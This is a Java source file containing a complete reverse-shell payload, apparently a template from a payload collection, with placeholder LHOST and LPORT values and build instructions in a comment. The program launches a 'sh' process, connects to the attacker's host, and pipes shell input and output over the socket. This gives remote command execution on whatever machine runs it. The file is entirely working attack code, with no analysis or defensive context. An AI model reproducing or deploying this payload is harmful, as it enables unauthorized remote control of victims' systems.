import java.net.*;
import java.io.*;

/*
 * build: javac ./Main.java && jar cfe ./main.jar Main ./Main.class
 * execute: java -jar ./main.jar
 */

public class Main {
    public static void main(String args[]) throws IOException, InterruptedException {
        String host = "§LHOST§";
        int port = §LPORT§;
        String shell = "sh";
        Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {
            while (pi.available()>0) so.write(pi.read());
            while (pe.available()>0) so.write(pe.read());
            while (si.available()>0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {
            }
        };
        p.destroy();
        s.close();
    }
}
